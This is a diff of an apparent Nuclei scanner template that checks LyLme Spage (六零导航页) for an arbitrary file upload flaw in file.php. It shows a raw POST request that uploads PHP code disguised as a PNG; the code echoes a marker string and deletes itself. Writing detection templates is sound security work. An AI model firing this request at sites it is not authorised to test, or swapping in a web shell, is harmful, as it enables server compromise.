@@ -3,12 +3,8 @@ info:
   name: 六零导航页 file.php 任意文件上传漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/gqdf7q0q7gbd80pq'
+  description: ''
   tags: file-upload,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: gqdf7q0q7gbd80pq
-    fofa: title=="上网导航 - LyLme Spage"
 http:
 - raw:
   - 'POST /include/file.php HTTP/1.1
@@ -32,8 +28,6 @@ http:
     X-Requested-With: XMLHttpRequest
 
 
-
-
     -----------------------------qttl7vemrsold314zg0f
 
 
@@ -41,8 +35,6 @@ http:
 
 
     Content-Type: image/png
-
-
 
 
     <?php echo "dudesuite";unlink(__FILE__);?>
